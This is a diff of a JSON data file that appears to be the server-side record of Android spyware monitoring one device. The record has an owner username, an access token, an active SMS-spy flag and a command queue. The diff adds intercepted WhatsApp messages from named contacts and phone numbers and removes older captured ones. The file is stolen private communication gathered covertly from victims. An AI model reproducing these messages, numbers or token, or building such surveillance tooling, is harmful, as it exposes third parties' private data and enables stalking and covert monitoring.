@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776860406451,
+    "lastSeen": 1776860409459,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "22/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860410295
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 851-1746-5790",
+        "content": "bantuin keluar dulu sayang",
+        "time": "22/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860410204
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Rafly",
+        "content": "kalo mau nunggu bang reno ini",
+        "time": "22/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860410193
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 851-3406-5819",
+        "content": "Oke",
+        "time": "22/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860410156
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 823-1199-7104",
+        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
+        "time": "22/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860410137
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Muhammad Amal Ardhafan",
+        "content": "Semangat ma disana",
+        "time": "22/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860409817
+      },
       {
         "appName": "WhatsApp",
         "sender": "Maya",
@@ -3971,54 +4019,6 @@
         "time": "22/04 15:15",
         "pkg": "com.whatsapp",
         "receivedAt": 1776842128440
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "7Sex Message",
-        "content": "‎63 pesan baru",
-        "time": "22/04 15:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842110969
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (63 pesan): ~ N9THCRAL",
-        "content": "🛒 Leaving Group",
-        "time": "22/04 15:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842110962
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "7Sex Message",
-        "content": "‎63 pesan baru",
-        "time": "22/04 15:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842108753
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (63 pesan): ~ N9THCRAL",
-        "content": "🛒 Leaving Group",
-        "time": "22/04 15:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842108642
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "7Sex Message",
-        "content": "‎63 pesan baru",
-        "time": "22/04 15:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842106996
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (63 pesan): ~ N9THCRAL",
-        "content": "🛒 Leaving Group",
-        "time": "22/04 15:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842106993
       }
     ],
     "galleryPhotos": [],
